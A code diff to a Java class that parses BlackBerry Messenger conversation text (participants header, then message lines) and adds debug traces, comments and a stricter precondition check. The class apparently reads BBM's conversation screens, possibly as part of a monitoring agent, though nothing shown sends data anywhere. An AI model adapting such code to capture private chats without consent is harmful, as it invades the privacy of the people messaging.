@@ -30,10 +30,10 @@ public class ConversationScreen {
     private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
     //#endif
 
+    // Vector<String>
     private static Vector parts;
-
     private static String partecipants;
-
+    
     private UiApplication bbmApplication;
     // Vector<Screen>
     //private Vector conversationScreens = new Vector();
@@ -179,10 +179,16 @@ public class ConversationScreen {
         boolean full;
         if (lineConversation.startsWith("Partecipants")) {
             full = true;
+            //#ifdef DEBUG
+            debug.trace("parseConversation: full");
+            //#endif
             return parseFullConversation(newConversation);
 
         } else {
             full = false;
+            //#ifdef DEBUG
+            debug.trace("parseConversation: partial");
+            //#endif
             return parseLinesConversation(lineConversation, 0);
         }
     }
@@ -199,7 +205,7 @@ public class ConversationScreen {
         try {
             //#ifdef DBC
             Check.requires(partecipants != null, "null partecipants");
-            Check.requires(parts != null, "null parts");
+            Check.requires(parts != null && parts.size() > 1, "null parts");
             //#endif
             Vector result = new Vector();
 
@@ -276,7 +282,6 @@ public class ConversationScreen {
      * @return
      */
     public static Vector parseFullConversation(String conversation) {
-
         // Participants:
         // -------------
         // Torcione, Whiteberry
@@ -307,8 +312,10 @@ public class ConversationScreen {
             Check.asserts(parts.size() >= 2, "wrong size parts");
             //#endif
 
+            // lines start at line 6
             int posMessages = StringUtils.getLinePos(conversation, 6);
 
+            // actual line parsing
             return parseLinesConversation(conversation, posMessages);
         } catch (Exception ex) {
             //#ifdef DEBUG
@@ -355,8 +362,6 @@ public class ConversationScreen {
                 return part.length() + 2;
             }
         }
-
         return 0;
     }
-
 }
